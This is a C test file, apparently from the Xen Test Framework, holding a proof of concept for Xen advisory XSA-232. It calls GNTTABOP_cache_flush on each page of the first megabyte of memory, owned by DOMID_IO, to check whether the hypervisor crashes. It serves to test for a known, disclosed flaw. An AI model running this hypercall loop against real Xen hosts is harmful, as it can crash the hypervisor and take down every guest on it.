/**
 * @file tests/xsa-232/main.c
 * @ref test-xsa-232
 *
 * @page test-xsa-232 XSA-232
 *
 * Advisory: [XSA-232](http://xenbits.xen.org/xsa/advisory-232.html)
 *
 * GNTTABOP_cache_flush takes a machine address, looks up the page owner and
 * unconditionally follows the owners grant table pointer.  For system domains
 * such as DOMID_IO, there is no grant table set up.
 *
 * Loop over the first 1MB of memory (which is owned by DOMID_IO), poking the
 * hypercall.  If Xen remains alive, it is probably not vulnerable.
 *
 * @see tests/xsa-232/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-232 PoC";

void test_main(void)
{
    struct gnttab_cache_flush flush = {
        .length = PAGE_SIZE,
        .op = GNTTAB_CACHE_INVAL | GNTTAB_CACHE_CLEAN,
    };

    for ( ; flush.a.dev_bus_addr < MB(1); flush.a.dev_bus_addr += PAGE_SIZE )
        hypercall_grant_table_op(GNTTABOP_cache_flush, &flush, 1);

    /* If Xen is alive at this point, it is probably not vulnerable. */

    xtf_success("Success: Probably not vulnerable to XSA-232\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
